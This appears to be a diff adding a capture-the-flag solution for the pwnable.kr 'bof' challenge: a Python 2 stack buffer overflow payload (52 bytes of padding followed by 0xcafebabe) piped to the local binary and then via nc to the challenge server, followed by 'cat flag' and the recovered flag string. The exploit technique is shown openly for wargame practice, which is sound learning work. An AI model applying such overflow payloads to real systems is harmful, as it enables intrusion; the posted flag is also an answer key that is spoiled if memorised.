@@ -1,0 +1,17 @@
+import struct
+a = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"
+b = struct.pack("I", 0xcafebabe)
+print a+b
+
+
+
+
+python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM'+'\xbe\xba\xfe\xca'" | ./bof
+( python -c "print 'A'*52+'\xbe\xba\xfe\xca'" ; cat) | ./bof
+
+//  ######## Solucion ############
+
+( python -c "print 'A'*52+'\xbe\xba\xfe\xca'" ; cat) | nc pwnable.kr 9000
+ls
+cat flag
+daddy, I just pwned a buFFer :)
